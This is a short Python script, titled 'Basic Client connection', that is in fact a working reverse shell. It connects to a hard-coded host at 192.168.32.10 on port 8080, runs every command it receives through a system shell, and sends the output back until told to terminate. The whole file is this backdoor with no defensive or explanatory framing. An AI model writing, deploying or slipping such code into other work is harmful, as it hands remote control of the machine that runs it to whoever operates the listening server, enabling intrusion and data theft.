#Basic Client connection

import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.32.10",8080))

    while True:

        command = s.recv(1024)
        deccommand = command.decode()

        if b'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(deccommand, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
def main():
    connect()

main()
